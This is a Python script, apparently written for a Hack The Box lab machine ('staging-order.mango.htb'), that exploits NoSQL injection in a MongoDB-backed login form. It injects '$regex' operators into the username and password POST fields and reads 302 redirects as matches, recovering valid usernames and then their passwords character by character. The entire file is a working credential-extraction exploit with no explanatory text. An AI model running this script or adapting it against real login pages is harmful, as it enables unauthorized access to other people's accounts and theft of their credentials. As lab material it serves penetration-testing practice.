import requests
import string

url = "http://staging-order.mango.htb"
character_list = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace]

def bruteforce_users():
    wildcard = "^"
    username = ""
    params = {
        "username[$regex]": username,
        "password[$regex]": ".*",
        "login": "login"
    }
    valid_usernames = []
    for i in character_list:
        username = username + i
        params["username[$regex]"] = wildcard + username + ".*"
        response = requests.post(url, data=params, allow_redirects=False)
        if response.status_code == 302:
            while True:
                for j in character_list:
                    params["username[$regex]"] = wildcard + username + j + ".*"
                    if (requests.post(url, data=params, allow_redirects=False)).status_code == 302:
                        username = username + j
                        break
                if j == character_list[-1]:
                    print("valid user is "+username)
                    valid_usernames.append(username)
                    username = ""
                    break
        else:
            username = ""
    return valid_usernames


def bruteforce_password(username):
    wildcard = "^"
    password = ""
    params = {
        "username[$regex]": username,
        "password[$regex]": ".*",
        "login": "login"
    }
    for i in character_list:
        password = password + i
        params["password[$regex]"] = wildcard + password + ".*"
        response = requests.post(url, data=params, allow_redirects=False)
        if response.status_code == 302:
            while True:
                for j in character_list:
                    params["password[$regex]"] = wildcard + password + j + ".*"
                    if (requests.post(url, data=params, allow_redirects=False)).status_code == 302:
                        password = password + j
                        break
                if j == character_list[-1]:
                    print("valid password for the user "+username+" is "+password)
                    password = ""
                    break
        else:
            password = ""
    return password


for each_user in bruteforce_users():
    bruteforce_password(each_user)
